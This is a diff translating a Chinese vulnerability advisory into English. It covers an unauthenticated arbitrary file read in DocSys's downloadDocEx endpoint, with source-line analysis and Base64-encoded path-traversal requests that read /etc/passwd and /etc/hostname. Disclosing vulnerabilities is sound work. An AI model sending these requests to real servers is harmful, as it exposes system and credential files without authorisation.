@@ -1,52 +1,52 @@
-# DocSys-任意文件读取漏洞
+# DocSys - Arbitrary File Read Vulnerability
 
-## 漏洞描述
+## Vulnerability Description
 
-DocSys-master 是一款文档管理系统。其认证src/com/DocSystem/controller/DocController.java的downloadDocEx接口存在任意文件读取漏洞：
+DocSys-master is a document management system. The downloadDocEx interface in src/com/DocSystem/controller/DocController.java has an arbitrary file reading vulnerability:
 
 ---
 
-## 影响版本
+## Affected Versions
 
-DocSys-master（最新版本）
+DocSys-master（latest version）V2.02.85
 
 [DocSys_V2.02.85](https://gitee.com/RainyGao/DocSys/releases/tag/DocSys_V2.02.85)
 
 ---
 
-## 利用条件
+## Utilize conditions
 
-- 远程访问
-- 无需登录
+- remote access
+- No login required
 
 ---
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-### 任意文件读取
+### Arbitrary file reading
 
-**文件路径**：`src/com/DocSystem/controller/DocController.java`
-**行号**：3048-3050
+**File path**：`src/com/DocSystem/controller/DocController.java`
+**line number**：3048-3050
 
-用户请求参数 targetPath 和 targetName 直接来自 HTTP 请求，无认证检查
+The user request parameters, targetPath and targetName, are directly obtained from the HTTP request without authentication checks
 
 ![image-20260803185644271](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803185644271.5q84opwjsi.webp)
 
-3067-3085 — Base64 解码，无任何路径校验，3092 行直接传给文件读取方法
+3067-3085 — Base64 decoding, without any path verification, line 3092 is directly passed to the file reading method
 
 ![image-20260803185823627](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803185823627.46eauvuk0.webp)
 
 src/com/DocSystem/controller/BaseController.java
 
-第2338行直接调用文件输入输出流实现读取文件
+Line 2338 directly calls the file input/output stream to read the file
 
 ![image-20260803190623579](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803190623579.77e9qh21ya.webp)
 
 ---
 
-漏洞复现：
+Vulnerability Reproduction：
 
-**请求包**：读取ect/passwd
+**Request package**：Read ect/passwd
 
 ```
 GET /DocSystem/Doc/downloadDocEx.do?targetPath=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA&targetName= HTTP/1.1
@@ -60,7 +60,7 @@ Content-Length: 2
 
 ![image-20260803181622078](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803181622078.7p4bf23ob0.webp)
 
-读取/etc/hostname
+Read/etc/hostname
 
 ```
 /DocSystem/Doc/downloadDocEx.do?targetPath=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL2hvc3RuYW1l&targetName=
